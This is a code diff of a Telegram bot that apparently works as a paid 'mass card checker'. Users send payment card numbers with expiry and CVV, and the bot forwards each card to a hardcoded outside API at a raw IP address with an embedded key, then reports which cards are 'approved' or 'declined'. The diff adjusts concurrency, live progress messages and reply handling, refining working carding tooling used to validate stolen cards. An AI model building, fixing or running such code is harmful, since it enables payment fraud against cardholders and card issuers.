@@ -1228,25 +1228,19 @@ from db import get_user, update_user  # your DB functions here
 OWNER_ID = 8438505794  # Replace with your Telegram user ID
 user_cooldowns = {}
 
-
+# -----------------------------
+# Authorization & Cooldowns
+# -----------------------------
 async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     user_id = update.effective_user.id
-
-    # Owner always allowed
     if user_id == OWNER_ID:
         return True
-
-    # Private chat → must be an authorized user with a plan
     if update.effective_chat.type == "private":
         user_data = await get_user(user_id)
         if user_data and user_data.get("plan") and user_data.get("credits", 0) > 0:
             return True
         return False
-
-    # In groups → allow all
     return True
-
-
 
 async def enforce_cooldown(user_id: int, update: Update) -> bool:
     cooldown = 5  # seconds
@@ -1262,11 +1256,7 @@ async def enforce_cooldown(user_id: int, update: Update) -> bool:
     user_cooldowns[user_id] = now
     return True
 
-
 async def consume_credit(user_id: int) -> bool:
-    """
-    Consume 1 credit per command
-    """
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
         new_credits = user_data["credits"] - 1
@@ -1285,25 +1275,34 @@ from telegram.helpers import escape_markdown
 from telegram.helpers import escape_markdown
 from telegram.constants import ParseMode
 
+import re
+import time
+import asyncio
+import aiohttp
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     approved_count = declined_count = error_count = checked_count = 0
     results = []
     total_cards = len(cards_to_check)
-    sem = asyncio.Semaphore(10)  # concurrent requests
+    sem = asyncio.Semaphore(10)  # limit concurrent requests
 
     async with aiohttp.ClientSession() as session:
 
         async def check_card(raw):
             nonlocal approved_count, declined_count, error_count, checked_count
+
             parts = raw.split("|")
             if len(parts) != 4:
                 error_count += 1
                 checked_count += 1
                 return f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`"
 
-            if len(parts[2]) == 4:
+            if len(parts[2]) == 4:  # convert yyyy to yy
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
+
             api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
 
             try:
@@ -1331,37 +1330,33 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             checked_count += 1
             return f"`{escape_markdown(cc_normalized, version=2)}`\n𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {escape_markdown(status_raw, version=2)}"
 
-        tasks = [check_card(card) for card in cards_to_check]
-
-        # Update message in batches (every 2 cards)
-        batch_size = 2
-        for i, task in enumerate(asyncio.as_completed(tasks), 1):
+        # Process cards one by one
+        for i, task in enumerate([check_card(card) for card in cards_to_check], 1):
             result = await task
             results.append(result)
 
-            if i % batch_size == 0 or i == total_cards:
-                current_time_taken = round(time.time() - start_time, 2)
-                current_summary = (
-                    f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
-                    f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
-                    f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
-                    f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
-                    f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
-                    f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
-                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
+            # Update message after each card
+            current_time_taken = round(time.time() - start_time, 2)
+            current_summary = (
+                f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+                f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
+                f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
+                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────\n"
+                + "\n──────── ⸙ ─────────\n".join(results)
+            )
+
+            try:
+                await processing_msg.edit_text(
+                    escape_markdown(current_summary, version=2),
+                    parse_mode=ParseMode.MARKDOWN_V2
                 )
+            except Exception as e:
+                print(f"⚠️ Failed to update message: {e}")
 
-                try:
-                    await processing_msg.edit_text(
-                        escape_markdown(current_summary, version=2)
-                        + "\n\n"
-                        + "\n──────── ⸙ ─────────\n".join(results),
-                        parse_mode=ParseMode.MARKDOWN_V2
-                    )
-                except Exception:
-                    pass
-
-    # Final summary (already escaped)
+    # Final summary
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
@@ -1408,7 +1403,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.args:
         raw_cards = ' '.join(context.args)
     elif update.effective_message.reply_to_message and update.effective_message.reply_to_message.text:
-        raw_cards = update.effective_message.reply_to_message.reply_to_message.text
+        raw_cards = update.effective_message.reply_to_message.text
 
     if not raw_cards:
         await update.effective_message.reply_text("⚠️ Usage: /mchk number|mm|yy|cvv")
@@ -1424,11 +1419,11 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Limit cards
+    # ✅ Limit cards (optional, remove if you want more)
     cards_to_check = card_lines[:10]
     if len(card_lines) > 10:
         await update.effective_message.reply_text(
-            "⚠️ Only 10 cards are allowed per request. Checking the first 10 now."
+            f"⚠️ Only 10 cards are allowed per request. Checking the first 10 now."
         )
 
     # ✅ Send initial message
@@ -1437,12 +1432,9 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ✅ Start background check
     start_time = time.time()
     try:
-        # await ensures exceptions are visible for debugging
         await check_cards_background(cards_to_check, user_id, user.first_name, processing_msg, start_time)
     except Exception as e:
         await processing_msg.edit_text(f"❌ Error during processing: {str(e)}")
-
-
 
 
 import time
